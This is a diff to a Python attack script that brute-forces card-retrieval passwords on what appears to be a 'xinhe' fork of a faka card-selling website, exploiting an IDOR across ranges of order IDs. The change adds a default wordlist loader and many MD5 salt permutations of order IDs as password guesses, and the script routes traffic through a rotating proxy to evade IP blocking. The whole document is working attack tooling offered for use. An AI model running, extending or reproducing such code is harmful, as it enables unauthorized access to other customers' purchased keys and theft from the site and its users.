@@ -12,6 +12,9 @@ Usage (when IP not blocked):
 """
 import argparse, hashlib, json, time, subprocess, sys, os
 
+SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
+DEFAULT_WORDLIST = os.path.join(SCRIPT_DIR, "xinhe_skey_wordlist.txt")
+
 try:
     from qingguo_proxy import get_proxy, egress_ip
     HAS_QG = True
@@ -33,18 +36,32 @@ COMMON_PASSWORDS = [
     HASHSALT,
 ]
 
+def load_wordlist(path):
+    words = []
+    with open(path, encoding="utf-8", errors="replace") as f:
+        for line in f:
+            w = line.strip()
+            if not w or w.startswith("#"):
+                continue
+            words.append(w)
+    return words
+
+
 def gen_skeys(extra=None, order_id=None):
-    import hashlib
     s = set(COMMON_PASSWORDS)
     if extra:
         s.update(extra)
     if order_id is not None:
         oid = str(order_id)
-        # xinhe fork: user-set 取卡密码; rainbow fallback: md5(id+SYS_KEY+id)
-        for a, b in [(oid, HASHSALT), (HASHSALT, oid), (oid, "xinhe001"), (oid, oid)]:
-            s.add(hashlib.md5((a + b).encode()).hexdigest())
-        s.add(hashlib.md5((oid + HASHSALT + oid).encode()).hexdigest())  # rainbow skey
+        salts = [HASHSALT, "xinhe001", "xinghe001", "xinghe0010", "faka", "qq", ""]
+        for salt in salts:
+            for a, b in [(oid, salt), (salt, oid), (oid + salt, ""), ("", oid + salt)]:
+                s.add(hashlib.md5((a + b).encode()).hexdigest())
+        s.add(hashlib.md5((oid + HASHSALT + oid).encode()).hexdigest())
         s.add(hashlib.md5(oid.encode()).hexdigest())
+        s.add(oid)
+        s.add(oid.zfill(6))
+        s.add(oid.zfill(8))
     return list(s)
 
 
@@ -96,7 +113,7 @@ def main():
     ap.add_argument("--id", type=int)
     ap.add_argument("--range", nargs=2, type=int, metavar=("START", "END"))
     ap.add_argument("--passwords", default="", help="comma-separated extra passwords")
-    ap.add_argument("--wordlist", help="password file")
+    ap.add_argument("--wordlist", default=None, help="password file (default: xinhe_skey_wordlist.txt)")
     ap.add_argument("-o", "--output", default="xinhe_idor_hits.json")
     ap.add_argument("--delay", type=float, default=DELAY, help="seconds between requests")
     args = ap.parse_args()
@@ -107,10 +124,13 @@ def main():
     elif HAS_QG:
         print("[*] 未设置 QG_AUTHKEY/QG_AUTHPWD，直连模式", flush=True)
 
-    extra = args.passwords.split(",") if args.passwords else None
-    if args.wordlist:
-        with open(args.wordlist) as f:
-            extra = (extra or []) + [l.strip() for l in f if l.strip()]
+    extra = args.passwords.split(",") if args.passwords else []
+    wl = args.wordlist
+    if wl is None and os.path.isfile(DEFAULT_WORDLIST):
+        wl = DEFAULT_WORDLIST
+    if wl:
+        extra += load_wordlist(wl)
+        print(f"[*] wordlist {wl}: {len(extra)} entries", flush=True)
 
     ids = []
     if args.id:
